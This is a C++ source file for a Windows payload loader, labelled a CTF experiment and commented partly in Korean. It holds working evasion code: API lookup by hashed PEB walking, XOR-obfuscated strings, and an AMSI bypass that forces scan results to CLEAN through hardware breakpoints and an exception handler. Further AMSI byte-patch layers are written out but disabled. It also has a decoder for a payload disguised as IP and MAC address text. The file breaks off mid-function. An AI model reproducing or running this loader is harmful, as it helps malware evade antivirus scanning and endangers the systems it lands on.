/*
 * CTF experiment - teammate lifecycle with expanded L1 only
 *
 * Preserves the teammate child-process and CLR lifecycle exactly.
 * No forced timeout is used.  The parent waits for the child to exit naturally.
 * AMSI L2/L3/L4 are excluded; expanded L1 is the only bypass layer.
 *
 * 활성화:
 *   - AMSI 다층 패치 (L0~L4, PEB 열거 + HWBP + 진입점 패치 + 시그니처 + JE)
 *   - PEB Walking + FNV-1a (AMSI L0/L1/L2 내부 사용 목적으로만 복원)
 *   - 스택 문자열 (STKSTR/STKWSTR)
 *   - SecureErase
 *   - HSF 디코더
 *   - Managed PE 실행 (documented CLR/OLE import)
 *
 * 비활성화 (#if 0):
 *   - ETW 패치
 *   - NTDLL 언훅
 *   - Anti-Debug / Anti-Sandbox
 *   - 네이티브 PE 수동 매핑 (RunNative)
 *
 * Build:
 *   x86_64-w64-mingw32-g++ loader_final.cpp -o loader.exe \
 *     -std=c++17 -Wall -O2 \
 *     -DSTR_OBF_KEY=0x5A -DAPI_HASH_SEED=0x1337 \
 *     -masm=intel \
 *     -lole32 -loleaut32 -lmscoree \
 *     -Wl,--dynamicbase,--nxcompat
 */

#define _CRT_RAND_S
#define WIN32_LEAN_AND_MEAN

/* ======================== EDIT ONLY HERE ======================== */
#ifndef FEATURE_AMSI_L0
#  define FEATURE_AMSI_L0             1  /* enumerate every loaded amsi.dll */
#endif
#ifndef FEATURE_AMSI_L1
#  define FEATURE_AMSI_L1             1  /* HWBP */
#endif
#ifndef FEATURE_AMSI_L2
#  define FEATURE_AMSI_L2             0  /* excluded */
#endif
#ifndef FEATURE_AMSI_L3
#  define FEATURE_AMSI_L3             0  /* excluded */
#endif
#ifndef FEATURE_AMSI_L4
#  define FEATURE_AMSI_L4             0  /* excluded */
#endif
#ifndef FEATURE_CHILD_ISOLATION
#  define FEATURE_CHILD_ISOLATION     1  /* sacrificial child */
#endif
#ifndef FEATURE_KEEP_CLR_ALIVE
#  define FEATURE_KEEP_CLR_ALIVE      1  /* retain CLR after Main returns */
#endif
/* ================================================================ */

#if (FEATURE_AMSI_L0 != 0 && FEATURE_AMSI_L0 != 1) || \
    (FEATURE_AMSI_L1 != 0 && FEATURE_AMSI_L1 != 1) || \
    (FEATURE_AMSI_L2 != 0 && FEATURE_AMSI_L2 != 1) || \
    (FEATURE_AMSI_L3 != 0 && FEATURE_AMSI_L3 != 1) || \
    (FEATURE_AMSI_L4 != 0 && FEATURE_AMSI_L4 != 1) || \
    (FEATURE_CHILD_ISOLATION != 0 && FEATURE_CHILD_ISOLATION != 1) || \
    (FEATURE_KEEP_CLR_ALIVE != 0 && FEATURE_KEEP_CLR_ALIVE != 1)
#  error Feature values must be 0 or 1
#endif

#include <Windows.h>
#include <winternl.h>
#include <intrin.h>

#include <objbase.h>
#include <oleauto.h>
#include <oaidl.h>
#include <unknwn.h>
#include <metahost.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>

/* ================================================================
 * 로그
 * ================================================================ */
#ifdef RELEASE_BUILD
#  define LOG(...)  ((void)0)
#else
#  define LOG(...)  printf(__VA_ARGS__)
#endif

/* ================================================================
 * [1] 스택 문자열 XOR 복호화
 * ================================================================ */
#ifndef STR_OBF_KEY
#  define STR_OBF_KEY 0x5A
#endif

namespace sob {
    constexpr char    key(size_t i) { return (char)(STR_OBF_KEY ^ ((i*7+13)%251)); }
    constexpr char    enc(char    c, size_t i) { return c ^ key(i); }
    constexpr wchar_t encw(wchar_t c, size_t i) { return c ^ (wchar_t)key(i); }

    template<size_t N> struct SE {
        char d[N]{};
        constexpr SE(const char(&s)[N]){ for(size_t i=0;i<N;i++) d[i]=enc(s[i],i); }
    };
    template<size_t N> struct WE {
        wchar_t d[N]{};
        constexpr WE(const wchar_t(&s)[N]){ for(size_t i=0;i<N;i++) d[i]=encw(s[i],i); }
    };
}

#define STKSTR(v, lit)                                              \
    constexpr sob::SE<sizeof(lit)> _se_##v{lit};                   \
    char v[sizeof(lit)];                                            \
    do { for(size_t _i=0;_i<sizeof(lit);_i++)                      \
             v[_i]=sob::enc(_se_##v.d[_i],_i); } while(0)

#define STKWSTR(v, lit)                                             \
    constexpr sob::WE<sizeof(lit)/2> _we_##v{lit};                 \
    wchar_t v[sizeof(lit)/2];                                       \
    do { for(size_t _i=0;_i<sizeof(lit)/2;_i++)                    \
             v[_i]=sob::encw(_we_##v.d[_i],_i); } while(0)

/* ================================================================
 * [2] SecureErase
 * ================================================================ */
static inline void SecureErase(void* p, size_t n){
    volatile unsigned char* vp=(volatile unsigned char*)p;
    for(size_t i=0;i<n;i++) vp[i]=0;
    _ReadWriteBarrier();
}

/* ================================================================
 * [3] PEB Walking + FNV-1a 해시 기반 API Resolve
 *     (AMSI L0/L1/L2 내부 사용 목적으로만 활성화)
 * ================================================================ */
#ifndef API_HASH_SEED
#  define API_HASH_SEED 0x1337u
#endif

namespace ah {
    constexpr wchar_t foldw(wchar_t c){
        return (c>=L'A'&&c<=L'Z')?(wchar_t)(c+(L'a'-L'A')):c;
    }
    constexpr uint32_t fnv(const char* s, uint32_t h=API_HASH_SEED){
        while(*s){ h^=(uint8_t)*s++; h*=16777619u; } return h;
    }
    constexpr uint32_t fnvw(const wchar_t* s, uint32_t h=API_HASH_SEED){
        while(*s){ h^=(uint32_t)foldw(*s++); h*=16777619u; } return h;
    }
    static uint32_t rfnv(const char* s){
        uint32_t h=API_HASH_SEED;
        while(*s){ h^=(uint8_t)*s++; h*=16777619u; } return h;
    }
    static uint32_t rfnvw(const wchar_t* s){
        uint32_t h=API_HASH_SEED;
        while(*s){ h^=(uint32_t)foldw(*s++); h*=16777619u; } return h;
    }
}

typedef struct { USHORT Len,Max; PWSTR Buf; } UNI_STR;
typedef struct {
    LIST_ENTRY lo,mo,io; PVOID Base,EP; ULONG ImgSz;
    UNI_STR FullName, BaseName;
} LDR_ENT;
typedef struct {
    ULONG Len; BOOL Init; PVOID Ss;
    LIST_ENTRY lo,mo,io;
} PEB_LDR;
typedef struct {
    BYTE r1[2]; BYTE Dbg; BYTE r2[1]; PVOID r3[2]; PEB_LDR* Ldr;
} PEB_M;

static PVOID ModByHash(uint32_t h){
    PEB_M* p=(PEB_M*)__readgsqword(0x60);
    LIST_ENTRY* lst=&p->Ldr->mo, *e=lst->Flink;
    while(e!=lst){
        auto* m=CONTAINING_RECORD(e,LDR_ENT,mo);
        if(m->BaseName.Buf && ah::rfnvw(m->BaseName.Buf)==h) return m->Base;
        e=e->Flink;
    }
    return NULL;
}

static PVOID ProcByHash(PVOID base, uint32_t h){
    if(!base) return NULL;
    BYTE* b=(BYTE*)base;
    auto* dos=(IMAGE_DOS_HEADER*)b;
    auto* nt=(IMAGE_NT_HEADERS*)(b+dos->e_lfanew);
    DWORD erva=nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    DWORD esz =nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    if(!erva) return NULL;
    auto* exp=(IMAGE_EXPORT_DIRECTORY*)(b+erva);
    DWORD* names=(DWORD*)(b+exp->AddressOfNames);
    WORD*  ords =(WORD* )(b+exp->AddressOfNameOrdinals);
    DWORD* funcs=(DWORD*)(b+exp->AddressOfFunctions);
    for(DWORD i=0;i<exp->NumberOfNames;i++){
        char* name=(char*)(b+names[i]);
        if(ah::rfnv(name)!=h) continue;
        PVOID r=(PVOID)(b+funcs[ords[i]]);
        DWORD_PTR rva=(BYTE*)r-b;
        if(rva>=erva&&rva<erva+esz){
            char fwd[256]{}; strncpy(fwd,(char*)r,255);
            char* dot=strchr(fwd,'.'); if(!dot) return NULL;
            *dot='\0'; char dll[260]{}; sprintf(dll,"%s.dll",fwd);
            int wl=MultiByteToWideChar(CP_ACP,0,dll,-1,NULL,0);
            wchar_t wdll[260]{}; MultiByteToWideChar(CP_ACP,0,dll,-1,wdll,wl);
            PVOID fb=ModByHash(ah::rfnvw(wdll));
            if(!fb){
                typedef HMODULE(WINAPI*fnLL)(LPCSTR);
                PVOID k32=ModByHash(ah::fnvw(L"kernel32.dll"));
                auto pLL=(fnLL)ProcByHash(k32,ah::fnv("LoadLibraryA"));
                if(pLL) fb=(PVOID)pLL(dll);
            }
            if(!fb) return NULL;
            return ProcByHash(fb,ah::rfnv(dot+1));
        }
        return r;
    }
    return NULL;
}

static PVOID LoadMod(const char* name){
    PVOID k32=ModByHash(ah::fnvw(L"kernel32.dll"));
    typedef HMODULE(WINAPI*fnLL)(LPCSTR);
    auto pLL=(fnLL)ProcByHash(k32,ah::fnv("LoadLibraryA"));
    if(!pLL) return NULL;
    return (PVOID)pLL(name);
}

/* HAPI 캐시 매크로 */
namespace fpo {
    constexpr uintptr_t K=0xDEADBEEFCAFEBABEULL;
    inline uintptr_t E(uintptr_t p){ return p^K; }
    inline uintptr_t D(uintptr_t e){ return e^K; }
}
#define HAPI(wdll,func) ([]()->void*{                       \
    constexpr uint32_t _dh=ah::fnvw(wdll);                  \
    constexpr uint32_t _fh=ah::fnv(func);                   \
    static uintptr_t _enc=0;                                 \
    if(!_enc){ void* _p=ProcByHash(ModByHash(_dh),_fh);     \
               _enc=fpo::E((uintptr_t)_p); }                \
    return (void*)fpo::D(_enc); }())

/* ================================================================
 * 편의 타입
 * ================================================================ */
typedef BOOL  (WINAPI*fn_VP) (LPVOID,SIZE_T,DWORD,PDWORD);
typedef LPVOID(WINAPI*fn_VA) (LPVOID,SIZE_T,DWORD,DWORD);
typedef BOOL  (WINAPI*fn_VF) (LPVOID,SIZE_T,DWORD);
typedef HANDLE(WINAPI*fn_CT) (LPSECURITY_ATTRIBUTES,SIZE_T,LPTHREAD_START_ROUTINE,LPVOID,DWORD,LPDWORD);
typedef BOOL  (WINAPI*fn_WPM)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T*);
typedef DWORD (WINAPI*fn_WFS)(HANDLE,DWORD);
typedef BOOL  (WINAPI*fn_CH) (HANDLE);
typedef HMODULE(WINAPI*fn_LL)(LPCSTR);

/* ================================================================
 * [4] ETW 패치 - 비활성화
 * ================================================================ */
#if 0
static void PatchETW(){ /* 비활성화 */ }
#endif

/* ================================================================
 * [5] NTDLL 언훅 - 비활성화
 * ================================================================ */
#if 0
static void UnhookNtdll(){ /* 비활성화 */ }
#endif

/* ================================================================
 * [6] AMSI 다층 패치 (L0 ~ L4 강화판)
 *
 *  L0  PEB 순회 → 프로세스 내 모든 amsi.dll 복사본 열거 후 개별 패치
 *  L1  HWBP 엔진: Dr0=ScanBuffer / Dr1=OpenSession / Dr2=ScanString
 *      → .text 메모리를 한 바이트도 수정하지 않음 (인메모리 스캔 대비)
 *  L2  진입점 바이트 패치:
 *      ScanBuffer / OpenSession / ScanString → B8 57 00 07 80 C3
 *                                              (mov eax,E_INVALIDARG; ret)
 *      AmsiInitialize                        → 33 C0 C3
 *                                              (xor eax,eax; ret / ctx=NULL)
 *  L3  AmsiOpenSession 'AMSI' 시그니처 패치 (+ JE 폴백)
 *  L4  JE → JNE 자가진단 루프 (ScanBuffer / OpenSession)
 *
 *  주의: L2의 AmsiInitialize 패치는 자가진단이 끝난 뒤 마지막에 수행
 * ================================================================ */
#define AMSI_SIG        0x49534D41u
#define AMSI_INVALIDARG 0x80070057u
#define MAX_CANDS       16
#define MAX_SCAN        0x1000

typedef HRESULT(WINAPI*fn_AmsiInit)   (LPCWSTR,PVOID*);
typedef HRESULT(WINAPI*fn_AmsiOpen)   (PVOID,PVOID*);
typedef HRESULT(WINAPI*fn_AmsiScan)   (PVOID,PVOID,ULONG,LPCWSTR,PVOID,int*);
typedef HRESULT(WINAPI*fn_AmsiScanStr)(PVOID,LPCWSTR,LPCWSTR,PVOID,int*);
typedef void   (WINAPI*fn_AmsiUninit) (PVOID);

/* ── 공통 유틸 ─────────────────────────────────────────────────── */
static void RandAppName(wchar_t* buf, int len){
    for(int i=0;i<len-1;i++){
        unsigned int r=0; rand_s(&r);
        buf[i]=(wchar_t)(L'a'+(r%26));
    }
    buf[len-1]=L'\0';
}

static DWORD FuncEnd(PBYTE f){
    for(DWORD i=0;i<MAX_SCAN-2;i++)
        if(f[i]==0xC3&&f[i+1]==0xCC&&f[i+2]==0xCC) return i;
    return 0;
}

static DWORD CollectJE(PBYTE f, DWORD end, PBYTE* cands, DWORD max){
    DWORD n=0;
    for(DWORD i=0;i<end&&n<max;i++){
        if(f[i]!=0x74) continue;
        LONG off=(LONG)(*(char*)(f+i+1));
        PBYTE mov=f+i+2+off;
        if(mov<f||(DWORD)(mov-f)+5>end) continue;
        if(*mov!=0xB8) continue;
        if(*(DWORD*)(mov+1)!=AMSI_INVALIDARG) continue;
        cands[n++]=f+i;
    }
    return n;
}

static void PatchJE(PBYTE* c, DWORD n, BOOL patch){
    auto pVP=(fn_VP)HAPI(L"kernel32.dll","VirtualProtect");
    DWORD old=0;
    for(DWORD i=0;i<n;i++)
        if(pVP&&pVP(c[i],1,PAGE_EXECUTE_READWRITE,&old)){
            *c[i]=patch?0x75:0x74;
            pVP(c[i],1,old,&old);
        }
}

/* ── 자가진단 ───────────────────────────────────────────────────── */
static BOOL SelfTestOpen(PVOID hAmsi){
    auto pInit  =(fn_AmsiInit)  ProcByHash(hAmsi,ah::fnv("AmsiInitialize"));
    auto pOpen  =(fn_AmsiOpen)  ProcByHash(hAmsi,ah::fnv("AmsiOpenSession"));
    auto pUninit=(fn_AmsiUninit)ProcByHash(hAmsi,ah::fnv("AmsiUninitialize"));
    if(!pInit||!pOpen||!pUninit) return FALSE;
    wchar_t name[12]; RandAppName(name,12);
    PVOID ctx=NULL;
    if(FAILED(pInit(name,&ctx))||!ctx) return FALSE;
    PVOID sess=NULL;
    HRESULT hr=pOpen(ctx,&sess);
    pUninit(ctx);
    return hr==(HRESULT)AMSI_INVALIDARG;
}

static BOOL SelfTestScan(PVOID hAmsi, BOOL* pCleanResult){
    auto pInit  =(fn_AmsiInit)  ProcByHash(hAmsi,ah::fnv("AmsiInitialize"));
    auto pScan  =(fn_AmsiScan)  ProcByHash(hAmsi,ah::fnv("AmsiScanBuffer"));
    auto pUninit=(fn_AmsiUninit)ProcByHash(hAmsi,ah::fnv("AmsiUninitialize"));
    if(pCleanResult) *pCleanResult=FALSE;
    if(!pInit||!pScan||!pUninit) return FALSE;
    wchar_t name[12]; RandAppName(name,12);
    PVOID ctx=NULL;
    if(FAILED(pInit(name,&ctx))||!ctx) return FALSE;
    unsigned int r=0; rand_s(&r);
    char dummy[8]{}; dummy[0]=(char)(0x41+(r%26)); dummy[1]=(char)(0x42+(r%13));
    int result=-1;
    HRESULT hr=pScan(ctx,dummy,4,name,NULL,&result);
    pUninit(ctx);
    /* HWBP 계층이 살아있으면 S_OK + result==0(CLEAN) */
    if(SUCCEEDED(hr)&&result==0){ if(pCleanResult)*pCleanResult=TRUE; return TRUE; }
    return hr==(HRESULT)AMSI_INVALIDARG;
}

/* ── L1: HWBP 엔진 ──────────────────────────────────────────────── */
#if FEATURE_AMSI_L1
static PVOID g_bpTargets[3] = {};
static PVOID g_VehHandle    = NULL;

static BOOL HwbpEngineHandler(PEXCEPTION_POINTERS Ex){
    PEXCEPTION_RECORD er=Ex->ExceptionRecord;
    PCONTEXT cx=Ex->ContextRecord;
    if(er->ExceptionCode!=EXCEPTION_SINGLE_STEP) return EXCEPTION_CONTINUE_SEARCH;

    /* AmsiScanBuffer: 결과 포인터에 CLEAN(0) 강제, RAX=S_OK */
    if(er->ExceptionAddress==g_bpTargets[0]){
        UINT_PTR ret=*(PULONG_PTR)cx->Rsp;
        PULONG   res=(PULONG)(*(PULONG_PTR)(cx->Rsp+6*sizeof(PVOID)));
        if(res) *res=0;
        cx->Rip=ret; cx->Rsp+=sizeof(PVOID); cx->Rax=S_OK;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    /* AmsiOpenSession / AmsiScanString: E_INVALIDARG 반환 */
    if(er->ExceptionAddress==g_bpTargets[1]||er->ExceptionAddress==g_bpTargets[2]){
        cx->Rip=*(PULONG_PTR)cx->Rsp;
        cx->Rsp+=sizeof(PVOID);
        cx->Rax=(DWORD)AMSI_INVALIDARG;
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static BOOL HwbpSet(ULONG pos, PVOID fn){
    CONTEXT cx{};
    cx.ContextFlags=CONTEXT_DEBUG_REGISTERS;
    if(!GetThreadContext(GetCurrentThread(),&cx)) return FALSE;
    if(fn){
        (&cx.Dr0)[pos]=(UINT_PTR)fn;
        cx.Dr7&=~(3ull<<(16+4*pos));
        cx.Dr7&=~(3ull<<(18+4*pos));
        cx.Dr7|= 1ull<<(2*pos);
    } else {
        (&cx.Dr0)[pos]=0;
        cx.Dr7&=~(1ull<<(2*pos));
    }
    return SetThreadContext(GetCurrentThread(),&cx)!=FALSE;
}

static BOOL InstallHwbpLayer(PVOID hAmsi){
    g_bpTargets[0]=ProcByHash(hAmsi,ah::fnv("AmsiScanBuffer"));
    g_bpTargets[1]=ProcByHash(hAmsi,ah::fnv("AmsiOpenSession"));
    g_bpTargets[2]=ProcByHash(hAmsi,ah::fnv("AmsiScanString"));
    if(!g_bpTargets[0]||!g_bpTargets[1]) return FALSE;

    g_VehHandle=AddVectoredExceptionHandler(1,(PVECTORED_EXCEPTION_HANDLER)HwbpEngineHandler);
    if(!g_VehHandle) return FALSE;

    HwbpSet(0,g_bpTargets[0]);
    HwbpSet(1,g_bpTargets[1]);
    if(g_bpTargets[2]) HwbpSet(2,g_bpTargets[2]);

    BOOL clean=FALSE;
    if(SelfTestScan(hAmsi,&clean)&&clean){
        LOG("[+] HWBP layer active (ScanBuffer/OpenSession/ScanString)\n");
        return TRUE;
    }
    /* 실패 시 정리 */
    HwbpSet(0,NULL); HwbpSet(1,NULL); HwbpSet(2,NULL);
    RemoveVectoredExceptionHandler(g_VehHandle); g_VehHandle=NULL;
    return FALSE;
}
#endif

/* ── L2: 진입점 바이트 패치 ────────────────────────────────────── */
#if FEATURE_AMSI_L2
static BOOL WriteBytesChecked(PVOID addr, const BYTE* patch, DWORD len){
    auto pVP=(fn_VP)HAPI(L"kernel32.dll","VirtualProtect");
    DWORD old=0;
    if(!pVP||!pVP(addr,len,PAGE_EXECUTE_READWRITE,&old)) return FALSE;
    memcpy(addr,patch,len);
    BOOL ok=(memcmp(addr,patch,len)==0);
    pVP(addr,len,old,&old);
    return ok;
}

static BOOL BytesIntact(PVOID addr, BYTE expectFirst){
    return (*(volatile BYTE*)addr)==expectFirst;
}
#endif

/* ── L3: 시그니처 패치 ─────────────────────────────────────────── */
#if FEATURE_AMSI_L3
static BOOL PatchAmsiSig(PVOID hAmsi, PBYTE f){
    auto pVP=(fn_VP)HAPI(L"kernel32.dll","VirtualProtect");
    DWORD end=FuncEnd(f); if(!end) return FALSE;
    for(DWORD x=2;x+4<end;x++){
        if(*(DWORD*)(f+x)!=AMSI_SIG) continue;
        BYTE op=f[x-2];
        if(op!=0x81&&op!=0x39&&op!=0x3B) continue;
        DWORD old=0;
        if(!pVP||!pVP(f+x,1,PAGE_EXECUTE_READWRITE,&old)) continue;
        *(BYTE*)(f+x)=0x43;
        pVP(f+x,1,old,&old);
        if(SelfTestOpen(hAmsi)){ LOG("[+] AMSI sig patch OK\n"); return TRUE; }
        if(pVP&&pVP(f+x,1,PAGE_EXECUTE_READWRITE,&old)){
            *(BYTE*)(f+x)=0x41; pVP(f+x,1,old,&old);
        }
    }
    return FALSE;
}
#endif

/* ── L4: JE → JNE 자가진단 루프 ────────────────────────────────── */
#if FEATURE_AMSI_L4
static BOOL PatchAmsiJE(PVOID hAmsi, PBYTE f, BOOL isOpen){
    PBYTE cands[MAX_CANDS]{}; DWORD end=FuncEnd(f); if(!end) return FALSE;
    DWORD n=CollectJE(f,end,cands,MAX_CANDS); if(!n) return FALSE;
    LOG("[i] %lu JE candidates\n",(unsigned long)n);

    PatchJE(cands,n,TRUE);
    BOOL ok=isOpen?SelfTestOpen(hAmsi):SelfTestScan(hAmsi,NULL);
    if(ok){ LOG("[+] JE batch patch OK\n"); return TRUE; }

    PatchJE(cands,n,FALSE);
    for(DWORD i=0;i<n;i++){
        PatchJE(&cands[i],1,TRUE);
        ok=isOpen?SelfTestOpen(hAmsi):SelfTestScan(hAmsi,NULL);
        if(ok){ LOG("[+] JE single patch OK @ +0x%03lX\n",(unsigned long)(cands[i]-f)); return TRUE; }
        PatchJE(&cands[i],1,FALSE);
    }
    LOG("[-] JE patch failed\n"); return FALSE;
}
#endif

/* ── 모듈 단위 오케스트레이터 ─────────────────────────────────── */
static BOOL PatchAmsiInModule(PVOID hAmsi){
#if FEATURE_AMSI_L2
    static const BYTE kEInvalid[6]={0xB8,0x57,0x00,0x07,0x80,0xC3}; /* mov eax,E_INVALIDARG; ret */
    static const BYTE kSokNull[3] ={0x33,0xC0,0xC3};                /* xor eax,eax; ret          */
#endif

    PBYTE pInit =(PBYTE)ProcByHash(hAmsi,ah::fnv("AmsiInitialize"));
    PBYTE pOpen =(PBYTE)ProcByHash(hAmsi,ah::fnv("AmsiOpenSession"));
    PBYTE pScan =(PBYTE)ProcByHash(hAmsi,ah::fnv("AmsiScanBuffer"));
    PBYTE pScanS=(PBYTE)ProcByHash(hAmsi,ah::fnv("AmsiScanString"));
    if(!pScan||!pOpen) return FALSE;

    BOOL bOpen=FALSE, bScan=FALSE;

    /* L1: HWBP (.text 무수정, 성공 시 선택적으로 L3 백업 추가) */
    BOOL hwbp=FALSE;
#if FEATURE_AMSI_L1
    hwbp=InstallHwbpLayer(hAmsi);
#endif
    if(hwbp){
        bOpen=TRUE; bScan=TRUE;
#if FEATURE_AMSI_L3
        PatchAmsiSig(hAmsi,pOpen); /* 지속성 폴백 */
        LOG("[+] HWBP layer OK, sig backup applied\n");
#else
        LOG("[+] HWBP layer OK\n");
#endif
    } else {
        /* L3: 시그니처 → JE 폴백 */
#if FEATURE_AMSI_L3
        bOpen=PatchAmsiSig(hAmsi,pOpen);
#endif
#if FEATURE_AMSI_L4
        if(!bOpen) bOpen=PatchAmsiJE(hAmsi,pOpen,TRUE);

        /* L4: ScanBuffer JE → JNE */
        bScan=PatchAmsiJE(hAmsi,pScan,FALSE);
#endif

#if FEATURE_AMSI_L2
        /* L2: ScanString 진입점 패치 */
        if(pScanS&&WriteBytesChecked(pScanS,kEInvalid,sizeof(kEInvalid)))
            LOG("[+] AmsiScanString entry patched\n");

        /* L2: ScanBuffer / OpenSession 진입점 패치 (프롤로그 확인 후) */
        if(BytesIntact(pScan,0x4C)||BytesIntact(pScan,0x48)||BytesIntact(pScan,0x40))
            if(WriteBytesChecked(pScan,kEInvalid,sizeof(kEInvalid)))
                { bScan=TRUE; LOG("[+] AmsiScanBuffer entry patched\n"); }
        if(BytesIntact(pOpen,0x4C)||BytesIntact(pOpen,0x48)||BytesIntact(pOpen,0x40))
            if(WriteBytesChecked(pOpen,kEInvalid,sizeof(kEInvalid)))
                { bOpen=TRUE; LOG("[+] AmsiOpenSession entry patched\n"); }

        /* L2: AmsiInitialize 패치 - 자가진단 끝난 뒤 마지막 */
        if(pInit&&(BytesIntact(pInit,0x4C)||BytesIntact(pInit,0x48)||BytesIntact(pInit,0x40)))
            if(WriteBytesChecked(pInit,kSokNull,sizeof(kSokNull)))
                LOG("[+] AmsiInitialize patched (ctx=NULL)\n");
#endif
    }

    LOG(bOpen&&bScan?"[+] AMSI fully patched (module)\n":"[!] AMSI partial (module)\n");
    return bOpen&&bScan;
}

/* ── L0: 모든 amsi.dll 복사본 열거 후 패치 ─────────────────────── */
static BOOL PatchAMSI(){
    STKSTR(sAmsi,"amsi.dll");
    STKWSTR(wAmsi,L"amsi.dll");

    /* 강제 로드 */
    PVOID first=ModByHash(ah::rfnvw(wAmsi));
    if(!first) first=LoadMod(sAmsi);

    /* L0=1: PEB 전체 순회. L0=0: 첫 모듈만 처리. */
    int patched=0, total=0;
#if FEATURE_AMSI_L0
    PEB_M* peb=(PEB_M*)__readgsqword(0x60);
    LIST_ENTRY* lst=&peb->Ldr->mo;
    LIST_ENTRY* e=lst->Flink;
    while(e!=lst){
        auto* m=CONTAINING_RECORD(e,LDR_ENT,mo);
        if(m->BaseName.Buf&&_wcsicmp(m->BaseName.Buf,wAmsi)==0){
            total++;
            if(PatchAmsiInModule(m->Base)) patched++;
        }
        e=e->Flink;
    }
    if(total==0&&first){ total=1; if(PatchAmsiInModule(first)) patched++; }
#else
    if(first){ total=1; if(PatchAmsiInModule(first)) patched++; }
#endif

    LOG("[i] AMSI modules: %d/%d patched\n",patched,total);
    return patched>0;
}

/* ================================================================
 * Anti-Debug / Anti-Sandbox - 비활성화
 * ================================================================ */
#if 0
static BOOL EnvBad(){ return FALSE; }
#endif

/* ================================================================
 * HSF 디코더
 * ================================================================ */
enum{ HSF_IPV4=1, HSF_IPV6=2, HSF_MAC=3 };
#define HSF_FNV_OFF  14695981039346656037ULL
#define HSF_FNV_PRI  1099511628211ULL
struct DATA{ void* data; size_t len; };

static int u16(FILE*f,uint16_t*v){ unsigned char b[2]; if(fread(b,1,2,f)!=2)return 0; *v=b[0]|((uint16_t)b[1]<<8); return 1; }
static int u64(FILE*f,uint64_t*v){ unsigned char b[8]; uint64_t r=0; if(fread(b,1,8,f)!=8)return 0; for(int i=0;i<8;i++)r|=(uint64_t)b[i]<<(i*8); *v=r; return 1; }
static uint64_t hfnv(uint64_t h,const unsigned char*d,size_t n){ for(size_t i=0;i<n;i++){h^=d[i];h*=HSF_FNV_PRI;} return h; }
static int hhex(char c){ if(c>='0'&&c<='9')return c-'0'; c=(char)toupper((unsigned char)c); if(c>='A'&&c<='F')return c-'A'+10; return -1; }

static int hIPv4(const char*t,unsigned char o[16]){
    const char*p=t; for(int i=0;i<4;i++){unsigned r=0,d=0;while(*p>='0'&&*p<='9'){r=r*10u+(*p-'0');if(r>255)return 0;++p;++d;}if(!d)return 0;o[i]=(unsigned char)r;if(i!=3){if(*p!='.')return 0;++p;}}return *p=='\0';
}
static int hIPv6(const char*t,unsigned char o[16]){
    if(strlen(t)!=39)return 0;
    for(int g=0;g<8;g++){size_t off=(size_t)g*5;int h0=hhex(t[off]),h1=hhex(t[off+1]),h2=hhex(t[off+2]),h3=hhex(t[off+3]);if(h0<0||h1<0||h2<0||h3<0)return 0;o[g*2]=(unsigned char)((h0<<4)|h1);o[g*2+1]=(unsigned char)((h2<<4)|h3);if(g!=7&&t[off+4]!=':')return 0;}return 1;
}
static int hMAC(const char*t,unsigned char o[16]){
    if(strlen(t)!=17)return 0;
    for(int i=0;i<6;i++){size_t off=(size_t)i*3;int hi=hhex(t[off]),lo=hhex(t[off+1]);if(hi<0||lo<0)return 0;o[i]=(unsigned char)((hi<<4)|lo);if(i!=5&&t[off+2]!='-')return 0;}return 1;
}
static size_t hChunk(unsigned char m){switch(m){case HSF_IPV4:return 4;case HSF_IPV6:return 16;case HSF_MAC:return 6;default:return 0;}}
static int hRec(unsigned char m,const char*t,unsigned char o[16]){memset(o,0,16);switch(m){case HSF_IPV4:return hIPv4(t,o);case HSF_IPV6:return hIPv6(t,o);case HSF_MAC:return hMAC(t,o);default:return 0;}}

static DATA LoadHSF(const char*path){
    DATA res{NULL,0};
    FILE*fp=fopen(path,"rb"); if(!fp) return res;

    unsigned char magic[4]{},ver=0,mode=0,rsv[2]{};
    uint64_t orig=0,cnt=0,exp_h=0,act=HSF_FNV_OFF,written=0;
    void* buf=NULL;

    STKSTR(sMagic,"HSF1"); /* 스택 문자열로 복원 */

    if(fread(magic,1,4,fp)!=4||memcmp(magic,sMagic,4)||
       fread(&ver,1,1,fp)!=1||fread(&mode,1,1,fp)!=1||fread(rsv,1,2,fp)!=2||
       !u64(fp,&orig)||!u64(fp,&cnt)||!u64(fp,&exp_h))
    { LOG("[-] Bad header\n"); goto cl; }

    if(ver!=1||rsv[0]||rsv[1]){ LOG("[-] Version\n"); goto cl; }
    { size_t ck=hChunk(mode); if(!ck||cnt!=orig/ck+(orig%ck!=0)) goto cl; }
    if(!orig||orig>0x7FFFFFFFull) goto cl;

    buf=malloc((size_t)orig); if(!buf) goto cl;

    for(uint64_t idx=0;idx<cnt;idx++){
        uint16_t tl=0; char text[64]{}; unsigned char dec[16]{}; size_t bw;
        if(!u16(fp,&tl)||!tl||tl>=64||fread(text,1,tl,fp)!=tl) goto cl;
        text[tl]='\0';
        if(!hRec(mode,text,dec)) goto cl;
        bw=hChunk(mode); if((uint64_t)bw>orig-written)bw=(size_t)(orig-written);
        if(bw){memcpy((BYTE*)buf+written,dec,bw);act=hfnv(act,dec,bw);written+=bw;}
    }
    if(written!=orig||fgetc(fp)!=EOF||act!=exp_h){ LOG("[-] Integrity\n"); goto cl; }
    LOG("[+] HSF OK: %llu bytes\n",(unsigned long long)written);
    res.data=buf; res.len=(size_t)written; buf=NULL;
cl:
    fclose(fp);
    if(buf){SecureErase(buf,(size_t)orig);free(buf);}
    return res;
}

/* ================================================================
 * PE 유틸
 * ================================================================ */
static IMAGE_NT_HEADERS* NtHdr(void*b){
    if(!b)return NULL;
    auto*dos=(IMAGE_DOS_HEADER*)b;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE||dos->e_lfanew<=0||dos->e_lfanew>1024)return NULL;
    auto*nt=(IMAGE_NT_HEADERS*)((BYTE*)b+dos->e_lfanew);
    return nt->Signature==IMAGE_NT_SIGNATURE?nt:NULL;
}

static bool IsMgd(const void*b,size_t sz){
    if(!b||sz<sizeof(IMAGE_DOS_HEADER))return false;
    auto*dos=(const IMAGE_DOS_HEADER*)b;
    if(dos->e_magic!=IMAGE_DOS_SIGNATURE||dos->e_lfanew<=0)return false;
